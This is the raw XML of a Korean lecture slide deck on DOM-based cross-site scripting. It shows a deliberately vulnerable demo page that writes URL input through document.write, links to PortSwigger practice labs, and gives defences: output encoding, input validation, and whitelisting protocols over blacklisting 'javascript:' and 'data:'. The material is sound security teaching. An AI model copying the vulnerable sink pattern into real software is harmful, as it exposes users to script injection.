              <a:t>DOM-based</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>는 서버와 관계없이 브라우저에서 발생하는 것이 차이점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63230B-F5D0-4956-8B4C-F6BC30D94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892384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D3D561-7E87-4180-B52D-0F3AB3380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DOM-based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DC32EA-F99F-45EF-90FF-1453BB2E5C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A8F273-A0E1-46B1-907F-E0FEB6DA5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35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A10C26-122C-43D6-AF85-4BD5F0957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5803" y="2141034"/>
            <a:ext cx="6020393" cy="3509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217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B1D6F8-12DE-4633-B260-0F0705AEF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DOM-based XSS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BCC476-9AD1-4ED3-8381-5E9D87D24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36</a:t>
            </a:fld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280952-0834-41CA-AB96-A13AD8BEFB0F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1215277" y="1868742"/>
            <a:ext cx="9860280" cy="369331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&lt;HTML&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&lt;TITLE&gt;Welcome!&lt;/TITLE&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Hi</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> var pos=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>document.URL.indexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>("name=")+5;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>document.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>document.URL.substring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>pos,document.URL.length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>));</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>br</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Welcome to our system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>This demo borrowed from http://www.webappsec.org/projects/articles/071105.shtml</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&lt;/HTML&gt;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23CB0DB-1494-456D-9B9A-7890687C04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277" y="5614767"/>
            <a:ext cx="7487695" cy="666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40082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1F5416-B1FA-4007-984F-32772C7A1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DOM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AFF1A9-D642-4D9C-907C-5B9E16B30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(lab-document-write-sink)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink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60C58F-3931-41A0-87B8-EC70F0492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29635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F4B5C5-D2F0-48A4-A465-BABBF8F0E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DOM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59C9D4-7F7D-4402-9C02-136354B63B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(lab-document-write-sink-inside-select-element)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element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4F7EDF-028C-4384-836B-DBADB4191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908464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23C05E-34FE-4FDC-8766-3FBE42A68E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DOM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61F46D-ABED-4BB7-8EB0-CDEC35C8D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  <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> (lab-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>innerhtml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>-sink)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink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B68B04-F450-4EB4-AA02-AB8303B19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39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65063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C0FB01-3B43-4003-9806-542C990EE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DOM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F60633-34F1-465C-AF55-33E85F43A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(lab-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>jquery</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>-attribute-sink)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink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268E9E-4094-413B-885F-ACE93F762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00407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149202-A163-4D5D-B978-B78656E8A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Exploiting DOM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95CC3B-CC0F-4EBD-96E6-4B997D2F59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실습 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(Stored DOM XSS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored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0FC2B27-9C41-4488-BFA8-F66E6BEEF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0370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53DA41-86C2-4174-84C2-78C166253A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8A39E48-BC2F-4A98-B604-6FA1E04503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XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>취약점은 쉽게 악용될 수 있으며</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격 효과도 커 공격자들이 자주 이용하는 기술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많은 조직에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격을 대응하기 위해 웹 방화벽</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(WAF)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 도입하여 방어</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>대부분은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>시그너쳐</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 기반의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격만을 탐지</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>특정 문자열을 탐지하는 기술은 쉽게 우회가 가능하여 방어가 효과적이지 못함</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Bypassing Signature-Based XSS Filters: Modifying Script Code - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>PortSwigger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개발자는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&lt;script&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>태그 등 위험한 문자를 무효화 하여 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>취약점을 예방</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>일일이 수동적으로 위험한 문자를 필터링 및 인코딩 하는 것은 현실적으로 불가능</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>취약점 잔존</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이러한 방식으로 인해 중소 및 대형 웹사이트 등에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>취약점이 지속적으로 발견되고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D507EC-EFAA-4BC1-877B-0C9E5CCB9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28020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306D62-86C7-4915-8889-7A86F70D8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D6311D-4BBC-404B-BCB1-FDA4248CE1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b="1" dirty="0"/>
              <a:t>입</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>출력 값 검증 및 무효화</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격을 차단하기 위해 태그 문자</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(&lt;, &gt;) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>등 위험한 문자 입력 시 문자 참조</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(HTML entity)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>로 필터링하고</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>서버에서 브라우저로 전송 시 문자를 인코딩</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/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문자 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>참조란</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>ASCII </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>문자</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 동일한 의미의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>문자로 변경하는 과정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3FF2D0-345B-485B-8698-E09E09CFD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43</a:t>
            </a:fld>
            <a:endParaRPr lang="ko-KR" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="그림 5" descr="테이블이(가) 표시된 사진&#10;&#10;자동 생성된 설명">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5C187C4-E112-44F1-9F0A-C3BB3CBCF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231" y="3605088"/>
            <a:ext cx="7611537" cy="1781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932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9DCA8-3722-4E10-A46F-7E242987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4FC825-6C8A-4D08-A1B3-35E5D6895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XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>차단은 일반적으로 두 가지 방어 계층을 통해 수행할 수 있음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b="1" dirty="0"/>
              <a:t>Encode data on output (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>출력 값 인코딩</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>)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b="1" dirty="0"/>
              <a:t>Validate input on arrival (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>입력 값 검증</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>)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9FA0ED-D2FC-4866-B7D2-645DBB16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008295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9DCA8-3722-4E10-A46F-7E242987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4FC825-6C8A-4D08-A1B3-35E5D6895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Encode data on output  (Output </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>값 인코딩</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>User</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>input data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>가 웹 페이지에 적히기 전에 인코딩을 적용해야 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b="1" dirty="0"/>
              <a:t>HTML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>에서는</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>허용되지 않는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>들에 대해</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>HTML entities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 이용하여 바꿔줘야 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b="1" dirty="0" err="1"/>
              <a:t>Javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>에서는</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>영숫자가 아닌 값은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>Unicode-escaped</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>해야함</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>.</a:t>
            </a:r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9FA0ED-D2FC-4866-B7D2-645DBB16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45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10C44E10-2FC6-4250-8635-36E713B2E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046" y="3247823"/>
            <a:ext cx="2569429" cy="87594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 descr="텍스트이(가) 표시된 사진&#10;&#10;자동 생성된 설명">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B7E69FE-5645-42B7-A12B-8DBA58359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046" y="4872386"/>
            <a:ext cx="2704635" cy="7843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101101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9DCA8-3722-4E10-A46F-7E242987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4FC825-6C8A-4D08-A1B3-35E5D6895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Validate input on arrival (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>서버로 도착하는 입력 값 검증</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>앞서 생각한 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>output </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>encoding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>방어의 가장 중요한 부분이지만</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>충분하지는 않음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입력이 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>서버로 수신되는 시점에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>가능한 한 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>유효성을 확인해야함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Input validation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>예시</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>#1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 사용자가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 제출할 경우</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>및 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>와 같은 안전한 프로토콜로 시작하는지 확인</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>만약 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0" err="1"/>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>가 허용된다면</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>#2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>사용자가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>으로 숫자를 제공해야하는 부분에</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>실제로 정수가 포함되어 있는지 확인</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>#3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>입력에 필요한 문자 집합만을 허용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2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9FA0ED-D2FC-4866-B7D2-645DBB16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03448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68FBB5-3503-4DB6-9414-0DD0C4A74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356F42-9B03-4E7C-970A-90D99AD3C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Validate input on arrival (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>서버로 도착하는 입력 값 검증</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r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Whitelisting vs blacklisting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b="1" dirty="0"/>
              <a:t>Input </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>유효성 검사에서는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>일반적으로 블랙리스트가 아닌 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>화이트리스트</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 사용해야 함</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>블랙리스트 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0" err="1"/>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>:, data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>:) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>등 목록을 만드는 대신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b="1" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>안전한 프로토콜 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>(HTTP, HTTPS) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>목록을 만들고 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>목록에 없으면 허용하지 않게 해야함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39FB0B-16B7-4507-8D0F-D0ABB78D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469083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59DCA8-3722-4E10-A46F-7E242987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4FC825-6C8A-4D08-A1B3-35E5D68951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Validate input on arrival (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>서버로 도착하는 입력 값 검증</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1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Allowing "safe" HTML</a:t>
            </a:r>
